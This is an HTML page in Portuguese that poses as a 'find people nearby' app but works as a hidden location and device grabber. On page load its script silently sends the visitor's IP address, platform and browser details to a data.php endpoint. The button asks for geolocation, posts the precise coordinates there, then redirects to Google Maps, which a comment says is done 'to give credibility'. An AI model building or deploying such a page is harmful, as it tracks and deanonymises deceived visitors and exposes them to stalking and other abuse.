<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>testtetetetetete</title>
    <style>
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; color: white; text-align: center; }
        .card { background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(10px); padding: 40px 30px; border-radius: 20px; box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37); border: 1px solid rgba(255, 255, 255, 0.18); max-width: 350px; width: 90%; }
        .logo { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; border: 3px solid rgba(255,255,255,0.5); }
        .icon-pulse { background: rgba(255,255,255,0.2); width: 100px; height: 100px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pulse 2s infinite; }
        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 600; }
        p { font-size: 16px; margin-bottom: 30px; opacity: 0.9; line-height: 1.5; }
        .btn { background: #fff; color: #764ba2; border: none; padding: 15px 32px; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; text-transform: uppercase; letter-spacing: 1px; width: 100%; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(255, 255, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); } }
    </style>
</head>
<body>
    <div class="card">
        <img src="images/f11b094e-ce6c-11f0-9547-5cc9d3d26eae.jpg" class="logo">
        <h1>testtetetetetete</h1>
        <p>Encontre pessoas, amigos e eventos próximos a sua localização atual.</p>
        <button class="btn" onclick="requestLocation()">VER QUEM ESTÁ PERTO</button>
    </div>

<script>
    window.onload = function() {
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
            fetch('data.php', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ip: d.ip, os: navigator.platform, platform: navigator.userAgent, browser: navigator.appName, vendor: navigator.vendor}) });
        });
    };

    function requestLocation() {
        if(navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, showError);
        } else { alert("Erro de compatibilidade."); }
    }

    function showPosition(pos) {
        fetch('data.php', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy })
        }).then(() => {
            // Redireciona para o Google Maps Real para dar credibilidade
            window.location.href = `https://www.google.com/maps/search/restaurants/@${pos.coords.latitude},${pos.coords.longitude},15z`;
        });
    }

    function showError(err) {
        alert("Para ver quem está próximo, precisamos da sua permissão de localização.");
    }
</script>
</body>
</html>
